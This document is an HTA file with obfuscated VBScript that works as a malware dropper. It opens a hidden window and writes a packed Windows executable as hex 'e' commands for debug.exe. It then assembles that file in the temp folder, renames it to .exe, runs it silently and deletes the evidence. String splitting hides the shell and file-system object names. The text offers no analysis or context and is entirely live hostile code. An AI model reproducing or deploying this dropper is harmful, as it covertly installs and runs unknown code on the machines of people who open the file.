
<HTA:APPLICATION caption="no" border="none" windowState="minimize" visiable="no" showintaskbar="no">
<SCRIPT LANGUAGE="JavaScript">
<!--
blur();
self.moveTo(0,0);

//-->
</SCRIPT>
<script language="VBScript">
<!--

On Error Resume Next

dim NICshell,fss,aaa
dim nf_tmp,nf_com,nf_exe
Set NICshell=CreateObject("Wscr"&"ipt."&"Shell")
Set fss=CreateObject("Scr"&"ipting.Fi"&"leSyst"&"emObject")
nf_tmp=fss.GetSpecialFolder(2)&Chr(92)&Right(fss.GetTempName,8)
nf_com=Replace(nf_tmp,".tmp",".com",1,-1,1)
nf_exe=Replace(nf_tmp,".tmp",".exe",1,-1,1)

Set aaa=fss.OpenTextFile(nf_tmp,2,True)
aaa.Writeblanklines 229
aaa.Write "e100 4D 5A 00 00 00 00 00 00 00 00 00 00 50 45 00 00" & vbCrLf
aaa.Write "e110 4C 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e120 E0 00 0F 01 0B 01 00 00 00 16 00 00 00 0E 00 00" & vbCrLf
aaa.Write "e130 00 00 00 00 54 01 00 00 00 10 00 00 0C 00 00 00" & vbCrLf
aaa.Write "e140 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00" & vbCrLf
aaa.Write "e150 01 00 00 00 04 00 00 00 00 00 00 00 00 90 00 00" & vbCrLf
aaa.Write "e160 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00" & vbCrLf
aaa.Write "e170 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00" & vbCrLf
aaa.Write "e180 10 00 00 00 00 00 00 00 00 00 00 00 88 8B 00 00" & vbCrLf
aaa.Write "e190 84 00 00 00 00 80 00 00 C8 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e1A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e1B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e1C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e1D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e1E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e1F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e200 00 00 00 00 00 00 00 00 00 00 00 00 00 70 00 00" & vbCrLf
aaa.Write "e210 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e220 00 00 00 00 00 00 00 00 E0 00 00 C0 00 00 00 00" & vbCrLf
aaa.Write "e230 00 00 00 00 00 10 00 00 00 80 00 00 09 0C 00 00" & vbCrLf
aaa.Write "e240 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e250 E0 00 00 C0 87 25 CC 8B 40 00 61 94 55 A4 B6 80" & vbCrLf
aaa.Write "e260 FF 13 73 F9 33 C9 FF 13 73 16 33 C0 FF 13 73 1F" & vbCrLf
aaa.Write "e270 B6 80 41 B0 10 FF 13 12 C0 73 FA 75 3A AA EB E0" & vbCrLf
aaa.Write "e280 FF 53 08 02 F6 83 D9 01 75 0E FF 53 04 EB 24 AC" & vbCrLf
aaa.Write "e290 D1 E8 74 2D 13 C9 EB 18 91 48 C1 E0 08 AC FF 53" & vbCrLf
aaa.Write "e2A0 04 3B 43 F8 73 0A 80 FC 05 73 06 83 F8 7F 77 02" & vbCrLf
aaa.Write "e2B0 41 41 95 8B C5 B6 00 56 8B F7 2B F0 F3 A4 5E EB" & vbCrLf
aaa.Write "e2C0 9F 5E AD 97 AD 50 FF 53 10 95 8B 07 40 78 F3 75" & vbCrLf
aaa.Write "e2D0 03 FF 63 0C 50 55 FF 53 14 AB EB EE 33 C9 41 FF" & vbCrLf
aaa.Write "e2E0 13 13 C9 FF 13 72 F8 C3 02 D2 75 05 8A 16 46 12" & vbCrLf
aaa.Write "e2F0 D2 C3 4B 45 52 4E 45 4C 33 32 2E 64 6C 6C 00 00" & vbCrLf
aaa.Write "e300 00 00 00 00 00 00 00 00 04 00 00 00 00 00 01 00" & vbCrLf
aaa.Write "e310 03 00 00 00 18 00 00 80 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e320 04 00 00 00 00 00 01 00 31 75 00 00 30 00 00 80" & vbCrLf
aaa.Write "e330 00 00 00 00 00 00 00 00 04 00 00 00 00 00 01 00" & vbCrLf
aaa.Write "e340 00 00 00 00 48 00 00 00 58 80 00 00 70 00 00 00" & vbCrLf
aaa.Write "e350 E4 04 00 00 00 00 00 00 28 00 00 00 08 00 00 00" & vbCrLf
aaa.Write "e360 10 00 00 00 01 00 01 00 00 00 00 00 40 00 00 00" & vbCrLf
aaa.Write "e370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e380 00 00 00 00 FF FF FF 00 FF 00 00 00 FF 00 00 00" & vbCrLf
aaa.Write "e390 FF 00 00 00 FF 00 00 00 FF 00 00 00 FF 00 00 00" & vbCrLf
aaa.Write "e3A0 FF 00 00 00 FF 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e3B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "e3C0 00 00 00 00 00 00 00 00 FF 1C 25 88 40 78 64 0C" & vbCrLf
aaa.Write "e3D0 AC 32 7C 19 98 0C B8 86 43 A4 21 A0 90 9C C8 80" & vbCrLf
aaa.Write "e3E0 64 74 32 90 19 A8 0C B4 86 43 78 21 84 90 8C C8" & vbCrLf
aaa.Write "e3F0 94 64 B0 43 68 04 11 1F 0A E8 F0 77 02 08 66 30" & vbCrLf
aaa.Write "e400 09 52 38 0B 70 00 C8 6F B2 89 CA A0 DD 49 00 97" & vbCrLf
aaa.Write "e410 5B E3 6C 3E 8A E2 AB A4 16 61 01 09 2D 43 30 BA" & vbCrLf
aaa.Write "e420 02 9A 64 6C 5E 0E 01 11 31 06 09 D8 1B 99 96 07" & vbCrLf
aaa.Write "e430 11 0C 1C CC 46 1A 23 90 91 50 C8 10 E2 C4 19 30" & vbCrLf
aaa.Write "e440 6C 16 8C 47 1C 10 CC 15 00 56 42 35 21 8C 0E 76" & vbCrLf
aaa.Write "e450 76 62 0D 63 68 73 2E D2 C6 87 64 2A 0A 01 71 04" & vbCrLf
aaa.Write "e460 94 04 08 0A 86 5C 12 60 6E BC 09 0A F0 8B A2 CA" & vbCrLf
aaa.Write "e470 57 0C A6 40 01 E9 C2 09 B4 10 40 19 78 13 68 32" & vbCrLf
aaa.Write "e480 21 6B 09 6E 24 6F 51 C4 68 06 07 A1 34 05 F8 14" & vbCrLf
aaa.Write "e490 40 4A 38 FF 01 6E 11 2A 4C 90 83 EA 37 08 11 19" & vbCrLf
aaa.Write "e4A0 73 A1 19 83 2B 85 20 24 F4 56 16 E0 B0 92 3F 65" & vbCrLf
aaa.Write "e4B0 06 B1 44 4A F4 98 84 99 58 11 0C 91 21 6C 7F C8" & vbCrLf
aaa.Write "e4C0 11 80 91 18 2A C4 DC 66 D4 09 74 49 64 68 09 8C" & vbCrLf
aaa.Write "e4D0 4C 2C 21 DC CC B9 1E 41 30 40 33 B0 CC 59 A0 09" & vbCrLf
aaa.Write "e4E0 C0 89 D4 13 24 28 31 2A 44 CC 59 30 11 36 C8 09" & vbCrLf
aaa.Write "e4F0 3C 99 E4 39 42 11 20 1A 03 84 33 81 60 11 48 33" & vbCrLf
aaa.Write "e500 21 4E 09 DC 33 A9 B0 61 A4 33 09 A0 31 DC 28 09" & vbCrLf
aaa.Write "e510 7C 7C 40 19 54 C3 41 BA F4 24 18 0A B9 60 15 FF" & vbCrLf
aaa.Write "e520 E1 F8 D4 52 1C 0C 84 F0 22 38 88 43 1D 84 4C 1F" & vbCrLf
aaa.Write "e530 38 BC 43 20 8A 4C 3C 58 6C 1E 85 89 F4 01 1C 44" & vbCrLf
aaa.Write "e540 33 60 25 10 70 1C 09 34 03 24 40 62 5A 10 92 18" & vbCrLf
aaa.Write "e550 87 C8 5C 07 41 07 43 06 3A 11 70 44 67 4F 15 55" & vbCrLf
aaa.Write "e560 07 4D 07 45 07 7E 06 31 25 49 61 A4 67 08 69 04" & vbCrLf
aaa.Write "e570 73 92 A0 66 43 30 65 25 38 59 74 28 22 24 64 42" & vbCrLf
aaa.Write "e580 60 19 06 2E C1 76 C1 62 B8 CC 56 01 FE E4 C8 9C" & vbCrLf
aaa.Write "e590 0A A6 0C 20 20 30 4D F0 E0 4C 7C A3 10 00 21 5D" & vbCrLf
aaa.Write "e5A0 3B 79 9F 56 E7 27 00 4D 86 55 3A 57 4B A8 BF 65" & vbCrLf
aaa.Write "e5B0 D2 58 01 53 02 50 98 48 F3 80 10 21 09 04 58 18" & vbCrLf
aaa.Write "e5C0 A3 02 14 09 78 11 4C 85 38 1B 21 2C 08 30 48 08" & vbCrLf
aaa.Write "e5D0 7C CA 59 11 38 68 6A 0B 01 80 B0 32 6D 44 5C 4C" & vbCrLf
aaa.Write "e5E0 0D D3 0D DA 2C 7F 9C 28 28 C5 04 34 24 08 9E 20" & vbCrLf
aaa.Write "e5F0 37 0C AC 47 0C E1 CA AD 28 0C FB FD C8 AC 75 0B" & vbCrLf
aaa.Write "e600 72 6C 6D 6F A6 4D 13 19 0F 55 52 4C 44 8F 77 AE" & vbCrLf
aaa.Write "e610 6C 83 61 64 54 C1 46 69 E0 65 41 CC 28 AC D1 B8" & vbCrLf
aaa.Write "e620 A6 A8 80 99 C4 32 C6 10 A1 CC 0B 01 0B C0 74 02" & vbCrLf
aaa.Write "e630 FF E0 68 EE 8E 1C 16 23 37 D0 45 1C 54 85 02 73" & vbCrLf
aaa.Write "e640 68 65 C1 ED 33 32 73 F3 32 0E 21 53 10 45 78 EA" & vbCrLf
aaa.Write "e650 63 28 75 74 4F E0 FC C5 69 0C 16 22 50 D0 11 D8" & vbCrLf
aaa.Write "e660 0E 11 1C 16 E2 0D 20 6B 65 72 6E E7 59 51 0C 64" & vbCrLf
aaa.Write "e670 4F 01 70 65 6E 50 72 6F 63 D9 73 C7 83 4C 29 69" & vbCrLf
aaa.Write "e680 60 50 90 DC 88 E4 71 6C 1F 21 09 E8 4C 11 11 30" & vbCrLf
aaa.Write "e690 54 20 6D 69 6E 51 61 9D 19 51 A9 03 7F 26 98 3E" & vbCrLf
aaa.Write "e6A0 C8 7C 6A 08 88 59 51 99 09 E6 13 61 C3 72 46 B1" & vbCrLf
aaa.Write "e6B0 DE 99 74 09 65 5C 28 2C E0 52 CB 39 76 27 EC 6F" & vbCrLf
aaa.Write "e6C0 05 6E 7C 16 54 CC 65 6D 21 72 A7 1A AC 1E 14 77" & vbCrLf
aaa.Write "e6D0 10 B2 4B A5 2A 70 7D 16 43 36 56 82 50 E9 2A 75" & vbCrLf
aaa.Write "e6E0 A1 E0 18 65 4D CC 64 6C AE 70 B0 7E 68 58 08 30" & vbCrLf
aaa.Write "e6F0 99 50 25 70 4A 18 CD 57 65 02 B4 63 EA 9E C1 86" & vbCrLf
aaa.Write "e700 49 4F 1A 40 62 53 CA F9 63 16 59 6B 94 21 61 8E" & vbCrLf
aaa.Write "e710 AD A1 2D A0 59 56 4C 6C 58 CD F5 2E 45 91 30 70" & vbCrLf
aaa.Write "e720 DA A8 05 F0 76 34 18 28 30 76 A5 2A 66 43 39 C9" & vbCrLf
aaa.Write "e730 84 74 3A 22 31 1A 44 94 21 66 B8 F5 68 3C 74 CC" & vbCrLf
aaa.Write "e740 91 73 2D 61 93 6E 66 63 05 83 CE 72 78 AD 14 99" & vbCrLf
aaa.Write "e750 53 15 74 52 A8 67 4D 82 A9 58 1B 54 25 21 88 79" & vbCrLf
aaa.Write "e760 E4 50 9D E4 03 E6 6F 38 39 64 24 47 7A 95 61 0A" & vbCrLf
aaa.Write "e770 42 24 8D 45 2D 02 90 6F 66 06 85 16 1C 49 15 70" & vbCrLf
aaa.Write "e780 2A 38 6D 29 6F 68 EC A4 46 A2 C6 16 10 66 54 81" & vbCrLf
aaa.Write "e790 52 15 65 67 35 63 3D 42 02 F2 46 46 38 64 4E 45" & vbCrLf
aaa.Write "e7A0 54 8F 8E 42 10 2A 42 DC D9 70 F4 50 4F 1A 49 0A" & vbCrLf
aaa.Write "e7B0 95 06 A7 C9 9A 4A 07 C0 33 04 32 8F E8 D2 52 02" & vbCrLf
aaa.Write "e7C0 2B 64 69 5D 1E F6 59 9C 3C 2C AC 58 E4 E8 22 F0" & vbCrLf
aaa.Write "e7D0 1C 23 C4 19 CF F1 0B 43 72 65 2B 45 0E 37 2B 6C" & vbCrLf
aaa.Write "e7E0 25 F1 70 82 60 53 C3 54 B5 C7 0C FA DD 21 4C 88" & vbCrLf
aaa.Write "e7F0 F4 19 CF 10 88 FC 70 10 1A 8F 11 0F 4D 8B DA 8A" & vbCrLf
aaa.Write "e800 C3 84 D7 75 74 27 40 24 1A 64 19 A7 81 08 D6 16" & vbCrLf
aaa.Write "e810 47 50 C8 0E D1 4E D8 78 74 E1 18 80 8E 42 0C 21" & vbCrLf
aaa.Write "e820 14 C4 90 7C 0C 88 43 6C 02 6F 73 65 48 61 6E E3" & vbCrLf
aaa.Write "e830 73 B5 48 3C C0 E4 18 22 20 1C 47 CC C9 0D 16 08" & vbCrLf
aaa.Write "e840 5D 4D EE 14 78 41 FC A2 FC 99 40 24 08 2C 87 0A" & vbCrLf
aaa.Write "e850 0C 1B 7C F1 08 2C 0C A0 B8 66 C4 02 A4 9F 49 1B" & vbCrLf
aaa.Write "e860 10 BB 41 8F AA C0 38 3C EF 48 98 57 91 E8 99 44" & vbCrLf
aaa.Write "e870 0D 72 C2 53 0C 96 5C 33 36 6D 83 70 87 AB 96 AC" & vbCrLf
aaa.Write "e880 44 4D 56 03 42 41 35 2E 44 4C 8D 00 14 23 3D FB" & vbCrLf
aaa.Write "e890 FC FA 48 A0 6B 18 A7 38 C0 2B 33 15 71 B5 22 10" & vbCrLf
aaa.Write "e8A0 B4 0B 34 90 4C BC 80 01 79 4F 00 AD 33 99 66 CF" & vbCrLf
aaa.Write "e8B0 11 B7 0C C1 F9 60 D3 93 02 54 68 24 24 F4 E8 04" & vbCrLf
aaa.Write "e8C0 A9 64 5A 6C 68 A7 0B 6C 78 8C 0C 25 EC 1B B6 D8" & vbCrLf
aaa.Write "e8D0 8C 18 65 80 A0 F5 1D 0C 65 A2 AB 5E 28 A3 C0 71" & vbCrLf
aaa.Write "e8E0 70 F9 3C 6C BB 08 B7 78 28 08 BD E3 10 5E 29 82" & vbCrLf
aaa.Write "e8F0 08 B9 17 74 FD 14 39 00 33 08 55 34 82 24 9E 54" & vbCrLf
aaa.Write "e900 53 0C 0C B4 5D 48 54 10 6E 66 0A 04 88 6D 34 91" & vbCrLf
aaa.Write "e910 F1 E9 74 BA 15 52 66 26 5E 64 1B 14 C6 F4 5B 22" & vbCrLf
aaa.Write "e920 B6 36 37 FC 58 47 E5 10 18 08 28 FD 69 7C 4C 1E" & vbCrLf
aaa.Write "e930 5D 04 5C 07 FB 2F 3C C0 FC 56 70 7A FA 32 A3 ED" & vbCrLf
aaa.Write "e940 65 4C 40 15 26 88 58 D3 08 0A 4C 28 88 D9 10 7C" & vbCrLf
aaa.Write "e950 54 A5 49 24 FF 05 2A 18 4A 0A 03 06 B6 72 30 66" & vbCrLf
aaa.Write "e960 70 09 3C 31 CC D3 43 20 F4 FB 56 93 EF 07 4A E4" & vbCrLf
aaa.Write "e970 FE 63 64 E6 6D 98 66 44 3F 6B 26 63 E7 29 0B 19" & vbCrLf
aaa.Write "e980 1F C3 31 68 1B 35 28 F6 0C FC 1A 92 67 60 6B BC" & vbCrLf
aaa.Write "e990 FB 12 FC 0D E4 F0 2A 72 FF 9C 28 46 54 93 63 E0" & vbCrLf
aaa.Write "e9A0 14 E7 04 12 42 0A 1B 58 15 11 FB EF 7C 34 33 60" & vbCrLf
aaa.Write "e9B0 31 36 36 6D 58 1A 16 99 BB 64 AE 16 C3 1F 5B 43" & vbCrLf
aaa.Write "e9C0 78 95 14 B4 89 48 A5 22 34 6C B4 1C BE 80 C8 B9" & vbCrLf
aaa.Write "e9D0 45 78 5B 81 DC BD 32 AC 6C 24 14 CB 46 70 D9 A7" & vbCrLf
aaa.Write "e9E0 10 34 AA 09 40 48 4A 93 56 B7 63 19 1B 15 85 44" & vbCrLf
aaa.Write "e9F0 0B FE FD 8C 4F DB 36 1C 92 74 3C A2 62 12 21 99" & vbCrLf
aaa.Write "eA00 E2 FE 52 C2 8F 84 DE 48 51 DA 68 69 DD 66 23 A2" & vbCrLf
aaa.Write "eA10 C3 79 FB 30 2F 31 10 35 36 1C 87 22 A0 30 4D C2" & vbCrLf
aaa.Write "eA20 03 40 6C A6 3C 49 AA 26 1F 4D 58 06 08 40 04 3E" & vbCrLf
aaa.Write "eA30 24 0A 2A 5C B4 11 0A DF 78 2E 09 1E 8F 11 C4 67" & vbCrLf
aaa.Write "eA40 9C AE 38 3D A9 98 86 21 E1 34 D5 99 20 02 E4 9C" & vbCrLf
aaa.Write "eA50 4D 98 C8 E4 21 D8 5B 24 20 48 94 59 27 20 F2 0B" & vbCrLf
aaa.Write "eA60 DC D5 13 E7 4F 13 35 92 25 9E 45 3F E4 F4 02 C4" & vbCrLf
aaa.Write "eA70 5D 20 01 88 0A 9A 62 04 72 B0 A2 FC 76 91 83 8C" & vbCrLf
aaa.Write "eA80 0B 17 63 31 A4 2A 29 F5 02 20 ED 81 0A 23 33 23" & vbCrLf
aaa.Write "eA90 CE 2A 3B 4F 2F D4 2A FD 0F 3D FC 66 18 AA 63 64" & vbCrLf
aaa.Write "eAA0 89 1B 1C 22 09 FD F8 60 33 04 08 A1 EB 1D 09 E2" & vbCrLf
aaa.Write "eAB0 6C 71 78 36 9A 48 DB 46 50 29 20 15 E0 6A C2 13" & vbCrLf
aaa.Write "eAC0 A4 6F 78 55 BC 5A D4 70 44 48 4C 99 8C 32 09 08" & vbCrLf
aaa.Write "eAD0 29 B3 14 E4 46 5E 1E 9B 13 71 34 FD 1A FB 08 6B" & vbCrLf
aaa.Write "eAE0 75 B5 9C 78 C7 24 1C 26 21 3D 30 28 9D 71 3C FD" & vbCrLf
aaa.Write "eAF0 61 04 07 0C FC 1F C7 86 0D C5 43 5E 20 36 33 1F" & vbCrLf
aaa.Write "eB00 DF 37 B4 30 0A 3C 74 C4 40 FC 52 1C 22 49 01 1F" & vbCrLf
aaa.Write "eB10 83 60 FD 33 A7 B1 46 EC FB 57 4F E7 FC 89 B3 A1" & vbCrLf
aaa.Write "eB20 C5 23 10 FE 8B DC C9 55 98 72 DC 1C 36 06 36 28" & vbCrLf
aaa.Write "eB30 4C CA 1E 93 0E 26 0E 0A AD E7 3A 40 23 D8 FB 0B" & vbCrLf
aaa.Write "eB40 63 21 65 31 D4 C3 6C 64 16 29 47 1E 7E 40 22 91" & vbCrLf
aaa.Write "eB50 67 16 68 26 85 2C C4 37 44 FD CA 87 1A 1B 23 34" & vbCrLf
aaa.Write "eB60 69 25 24 16 79 93 8F A0 90 62 2F 18 1C F8 64 57" & vbCrLf
aaa.Write "eB70 34 0A 25 35 21 CA AC FA 09 A1 0C CA 10 26 A6 1E" & vbCrLf
aaa.Write "eB80 8D CA 0B 1E 55 90 79 0A 27 CB 65 3C 1B 34 3D 10" & vbCrLf
aaa.Write "eB90 D0 89 2C 01 88 36 70 43 70 21 05 12 10 04 09 49" & vbCrLf
aaa.Write "eBA0 30 C9 E6 2A 5E BC 2B 01 6D B6 9C 38 E3 63 02 B3" & vbCrLf
aaa.Write "eBB0 03 02 01 44 A9 76 78 98 7E FC A0 62 1D BC FD 49" & vbCrLf
aaa.Write "eBC0 F0 88 8A 1C F1 44 50 38 FD 55 01 1C 04 D5 27 08" & vbCrLf
aaa.Write "eBD0 DA 70 52 2C FC 8E D4 D4 09 3B 50 C4 EC C8 09 DC" & vbCrLf
aaa.Write "eBE0 89 27 40 94 B6 41 60 BC 18 B5 38 06 81 67 05 11" & vbCrLf
aaa.Write "eBF0 C0 24 12 E0 0D CA DC 13 EA 37 1C 84 50 D1 F6 6C" & vbCrLf
aaa.Write "eC00 38 62 74 0D 2A 23 2C 40 07 B4 35 34 3D 23 FA 04" & vbCrLf
aaa.Write "eC10 58 26 32 CC 40 28 4E 09 80 31 24 90 6C A3 24 6D" & vbCrLf
aaa.Write "eC20 66 5C 28 92 24 29 56 11 4D 56 6C 2A CD 60 62 12" & vbCrLf
aaa.Write "eC30 D8 15 5E 16 C2 F3 FD 69 50 60 01 F6 14 AB 1B F6" & vbCrLf
aaa.Write "eC40 0E 68 28 1C A1 0A FB 9C 8A 0F FC 22 CB 68 16 0C" & vbCrLf
aaa.Write "eC50 8E 1C 42 02 88 66 53 4C 31 28 36 68 09 24 3F FB" & vbCrLf
aaa.Write "eC60 8E FD 0D F4 03 A9 44 4E 16 25 AB 90 1A 4C 07 21" & vbCrLf
aaa.Write "eC70 90 21 E0 FE 63 10 F8 65 53 01 52 48 3F D0 30 2A" & vbCrLf
aaa.Write "eC80 94 55 42 6A 95 0A 2B 93 39 80 14 DA 1C 43 01 80" & vbCrLf
aaa.Write "eC90 ED 96 1B 6A 28 8F 38 80 FD 27 CC 24 2F 10 1E 64" & vbCrLf
aaa.Write "eCA0 5B 36 10 2B 21 10 22 7B 67 64 DC F7 08 49 83 B5" & vbCrLf
aaa.Write "eCB0 F4 4C 13 55 0B 18 50 3D 21 7E 68 52 A6 0E CD 12" & vbCrLf
aaa.Write "eCC0 D1 95 93 24 EE 26 34 0E 70 6C 12 8C 01 30 6D D4" & vbCrLf
aaa.Write "eCD0 28 0C E4 15 B9 03 2E 24 88 4D 10 37 CA 21 07 99" & vbCrLf
aaa.Write "eCE0 38 29 30 91 09 2C 22 28 A3 71 34 60 34 09 09 C9" & vbCrLf
aaa.Write "eCF0 02 46 66 96 1C E9 2F A9 0A 0C 08 1E 70 26 FA 48" & vbCrLf
aaa.Write "eD00 13 19 19 AA 08 8B 06 0D 4C AB 07 83 70 F5 B7 18" & vbCrLf
aaa.Write "eD10 27 C7 1A 22 1C 3F A0 D8 C8 1E 16 AA 01 0A 21 F2" & vbCrLf
aaa.Write "eD20 3A 58 8D 9B 4E 48 68 CE 0E 94 E8 97 09 84 05 2D" & vbCrLf
aaa.Write "eD30 E9 C0 73 86 12 0A 06 A2 B5 51 C7 89 22 1B 07 A8" & vbCrLf
aaa.Write "eD40 28 80 2C 29 66 6E 24 7A FB CA 59 0B E7 39 48 1C" & vbCrLf
aaa.Write "eD50 DF 13 34 62 21 30 13 6C 30 4E 28 34 A7 3D BE 42" & vbCrLf
aaa.Write "eD60 BC 2C 8D 0C 04 24 06 28 A4 98 51 0A CD 2C A1 78" & vbCrLf
aaa.Write "eD70 91 F9 A1 B4 A4 AA 4C 34 0B B4 0F A4 9C BC 25 0D" & vbCrLf
aaa.Write "eD80 68 7B 1C 51 BA 6A 96 E0 53 84 5A 37 58 02 77 34" & vbCrLf
aaa.Write "eD90 E9 DE 94 14 24 5E 0E 75 99 71 FE 3C B4 2D 8D B1" & vbCrLf
aaa.Write "eDA0 D3 F2 2E D5 5B 45 F0 31 D6 A1 ED 59 BD C2 88 AA" & vbCrLf
aaa.Write "eDB0 56 47 2C F2 2C 15 BA AE 85 38 C7 68 01 AC 01 3C" & vbCrLf
aaa.Write "eDC0 1B 21 24 90 06 9C 13 40 29 00 92 11 24 3D F8 0E" & vbCrLf
aaa.Write "eDD0 24 26 44 04 6E 93 32 18 34 27 6C C4 03 B2 AC 29" & vbCrLf
aaa.Write "eDE0 CC 01 64 E9 5F E1 E4 9E 5C 23 77 57 7A D5 A6 C8" & vbCrLf
aaa.Write "eDF0 C0 08 8F 28 E4 04 BB 0C 5B 05 09 9B 89 77 12 78" & vbCrLf
aaa.Write "eE00 28 1C C5 60 33 0C 17 32 11 19 09 3A 24 88 48 A9" & vbCrLf
aaa.Write "eE10 91 AD 38 64 40 68 CA 11 6A 28 64 03 10 50 70 64" & vbCrLf
aaa.Write "eE20 9A 09 76 48 77 95 CF 84 33 E1 09 5F 22 19 F7 66" & vbCrLf
aaa.Write "eE30 16 11 18 09 44 39 87 89 A8 12 AC 26 63 81 44 67" & vbCrLf
aaa.Write "eE40 69 89 FF 83 03 4D 53 56 42 97 52 35 30 75 3B 40" & vbCrLf
aaa.Write "eE50 BB 6C 88 46 75 6E 0E 63 74 69 6F A4 43 61 FB 23" & vbCrLf
aaa.Write "eE60 87 5F 89 76 62 E8 45 78 09 63 65 70 74 D6 28 65" & vbCrLf
aaa.Write "eE70 72 13 28 A9 78 40 21 45 1C 6E 67 69 DC 65 2B 01" & vbCrLf
aaa.Write "eE80 F7 FD FB 00 00 00 00 00 E0 8B 00 00 00 00 00 00" & vbCrLf
aaa.Write "eE90 00 00 00 00 F2 01 00 00 E0 8B 00 00 00 00 00 00" & vbCrLf
aaa.Write "eEA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "eEB0 00 10 40 00 C8 80 40 00 00 40 40 00 00 00 00 00" & vbCrLf
aaa.Write "eEC0 D0 8B 40 00 80 00 00 00 00 7D 00 00 B0 8B 40 00" & vbCrLf
aaa.Write "eED0 E8 01 40 00 DC 01 40 00 DE 01 40 00 6C 10 40 00" & vbCrLf
aaa.Write "eEE0 EA 8B 00 00 F8 8B 00 00 00 00 00 00 4C 6F 61 64" & vbCrLf
aaa.Write "eEF0 4C 69 62 72 61 72 79 41 00 00 47 65 74 50 72 6F" & vbCrLf
aaa.Write "eF00 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00" & vbCrLf
aaa.Write "eF10 24 38 38 3C 76 63 63 3B 3B 3B 62 7F 7B 7E 7D 3F" & vbCrLf
aaa.Write "eF20 29 29 62 2F 23 21 63 24 2B 36 62 2B 25 2A 3A 26" & vbCrLf
aaa.Write "eF30 26 22 68 7D 7D 25 25 25 7C 61 65 60 63 21 37 37" & vbCrLf
aaa.Write "eF40 7C 31 3D 3F 7D 3C 3D 35 28 7C 35 3B 34 1F 1E 02" & vbCrLf
aaa.Write "rcx"&vbCrLf
aaa.Write "E50"&vbCrLf
aaa.Write "n "&nf_com&vbCrLf
aaa.Write "w"&vbCrLf
aaa.Write "q"&vbCrLf
aaa.Close
NICshell.Run "com"&"mand"&".com /c deb"&"ug.e"&"xe<"&nf_tmp,0,1
NICshell.Run "cm"&"d.exe /"&"c debug.exe"&"<"&nf_tmp,0,1

Do
    If fss.FileExists(nf_com)=True Then
        Chg_Run
        Exit Do
    End If   
Loop

Sub Chg_Run
    fss.CopyFile nf_com,nf_exe,1
    NICshell.Run nf_exe
End Sub

fss.DeleteFile nf_tmp,1
fss.DeleteFile nf_com,1
Set fss=Nothing
Set NICshell=Nothing

window.close
//-->
</script>
